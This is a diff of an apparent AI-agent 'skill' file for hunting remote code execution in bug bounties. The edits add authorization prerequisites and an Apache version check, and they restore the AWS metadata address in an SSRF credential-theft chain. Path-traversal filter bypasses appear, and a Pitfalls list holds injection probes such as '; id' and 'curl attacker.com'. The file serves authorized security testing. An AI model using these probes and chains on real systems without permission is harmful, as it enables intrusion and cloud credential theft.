@@ -4,13 +4,34 @@ description: "Hunting skill for rce vulnerabilities. Built from 67 public bug bo
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [rce, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [rce, hunt, redteam]
+  category: redteam
 ---
 
 ## When to Use
 
 Use when the target has any endpoint that processes user-controlled input through an execution layer — template engines, shell commands, YAML/XML parsers, file paths used in operations, package resolution, or configuration files. RCE is the highest-payout vulnerability class because it grants direct execution control over target infrastructure. Every admin/management console, template/preview endpoint, upload processor, deserialization sink, and dependency resolver is a candidate. Highest-value targets: enterprise server products (GHES, self-hosted GitLab), supply chain/package registries, cloud-native infrastructure, and admin/management consoles.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `kubectl`, `ysoserial`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+curl --max-time 30 --connect-timeout 10 -sI http://target/ | grep -i "Server:"
+# Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)
+# Patched:    Apache/2.4.51+
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -348,7 +369,7 @@ data:text/html,<script>alert(1)</script>
 ### Bypass: Path traversal filters
 ```
 # Basic filter bypass
-../           → ..%2F → %2e%2e%2f → ....// 
+../           → ..%2F → %2e%2e%2f → ....//
 # Double encoding
 %252e%252e%252f
 # Unicode normalization
@@ -411,7 +432,7 @@ RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed o
 ### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)
 
 - **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
-- **B.** Point SSRF at AWS IMDSv1 metadata: `http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
+- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
 - **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
 - **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
 - **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `hunt-ssrf` Disclosed Report Citation #6.
@@ -471,36 +492,20 @@ Cross-references:
 
 ---
 
-## Verification
-
-Run this self-test to confirm rce hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-rce" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Command injection in non-production environment** — `; id` returning the username is not RCE unless you can escalate to arbitrary command execution.
 - **eval/exec with partially controlled input** — if only part of the input reaches eval, the exploit may be harder. Document what you control.
 - **OOB RCE without confirmation** — `curl attacker.com` in a blind RCE proves command execution. DNS-only callback is weaker evidence.
 - **Deserialization RCE without gadget chain** — `ysoserial URLDNS` proves deserialization, not RCE. Need a Runtime.exec gadget.
 - **Template injection without code execution** — `{{7*7}}` returning 49 proves SSTI. Need to escalate to actual code execution for RCE severity.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
